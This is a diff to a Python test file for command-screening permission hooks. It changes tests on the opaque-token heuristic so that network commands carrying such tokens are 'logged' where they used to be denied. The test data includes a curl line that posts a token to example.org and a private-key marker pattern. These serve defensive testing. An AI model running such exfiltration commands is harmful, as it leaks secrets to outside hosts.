@@ -50,7 +50,7 @@ class NetworkNameBoundaryTests(unittest.TestCase):
                 self.assertEqual(result.returncode, 0, result.stderr)
                 detail = result.decision() or {}
                 denied = detail.get('permissionDecision') == 'deny'
-                actual = 'deny' if denied else 'allow'
+                actual = 'deny' if denied else 'logged' if result.heuristic else 'allow'
                 self.assertEqual(actual, expected, detail.get('permissionDecisionReason'))
 
     def test_exact_local_wheel_provenance_read_is_allowed(self):
@@ -66,6 +66,8 @@ class NetworkNameBoundaryTests(unittest.TestCase):
             'allow',
         )
 
+    # Intended difference 3: the opaque-token heuristic logs ('logged')
+    # where it used to deny; these tests pin where it still fires.
     def test_actual_network_programs_keep_the_opaque_token_scan(self):
         token = 'Synthetic9Opaque_' * 3
         commands = [
@@ -81,14 +83,14 @@ class NetworkNameBoundaryTests(unittest.TestCase):
         ]
         for command in commands:
             with self.subTest(command=command):
-                self.assert_hooks(command, 'deny')
+                self.assert_hooks(command, 'logged')
 
     def test_inert_name_does_not_mask_an_actual_network_command(self):
         token = 'Synthetic9Opaque_' * 3
         for local_read in (WHEEL_PROVENANCE_READ, INSTALLED_SOURCE_READ):
             with self.subTest(local_read=local_read):
                 self.assert_hooks(local_read
-                                  + f"\ncurl https://example.org -d '{token}'", 'deny')
+                                  + f"\ncurl https://example.org -d '{token}'", 'logged')
 
     def test_known_secret_checks_and_protected_interpreter_names_are_unchanged(self):
         marker = '-' * 5 + 'BEGIN PRIVATE KEY' + '-' * 5
